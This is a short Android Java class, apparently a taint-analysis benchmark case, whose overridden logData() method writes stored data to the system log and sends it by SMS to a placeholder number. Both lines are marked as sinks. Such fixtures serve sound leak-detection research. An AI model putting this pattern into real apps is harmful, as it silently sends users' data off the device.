package de.ecspride;

import android.telephony.SmsManager;
import android.util.Log;

public class DataLeak extends NoDataLeak{
	
	public DataLeak(String data){
		super(data);
	}
	
	@Override
	public void logData(){
		Log.i("LOG", super.getData()); //sink
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage("+49 1234", null, super.getData(), null, null); //sink
	}
}
